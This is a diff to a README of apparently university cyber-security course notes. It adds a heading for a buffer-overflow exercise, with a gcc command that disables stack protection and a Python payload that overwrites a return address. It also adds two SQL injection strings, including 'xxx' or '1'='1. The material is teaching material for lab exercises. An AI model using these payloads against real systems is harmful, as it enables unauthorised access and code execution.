@@ -1,5 +1,6 @@
-# UNIMORE-cyber-security
+## UNIMORE-cyber-security
 
+# Buffer Overflow
 ```commandline
 gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
 ```
@@ -36,4 +37,12 @@ import sys
 length = 10
 payload = b"A" * length + b'\x6b\x84\x04\x08'
 sys.stdout.buffer.write(payload)
+```
+
+# SQL Injection
+```commandline
+'--
+```
+```commandline
+xxx' or '1'='1
 ```
